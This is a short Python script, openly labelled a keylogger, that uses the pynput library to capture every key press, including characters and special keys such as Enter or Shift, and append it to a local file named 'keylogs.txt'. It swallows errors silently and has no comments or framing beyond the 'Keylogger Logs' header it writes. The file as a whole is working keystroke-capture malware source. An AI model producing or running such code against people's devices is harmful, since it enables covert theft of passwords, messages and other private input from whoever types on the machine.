from pynput import keyboard
import os
import platform

LOG_FILE = "keylogs.txt"

if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        f.write("=== Keylogger Logs ({}) ===\n\n".format(platform.system()))

def log_key(key):
    try:
        if hasattr(key, 'char') and key.char:
            entry = key.char
        else:
            entry = f"[{key.name.upper()}]"

        with open(LOG_FILE, "a") as f:
            f.write(entry + "\n")

    except Exception:
        pass

listener = keyboard.Listener(on_press=log_key)
listener.start()
listener.join()
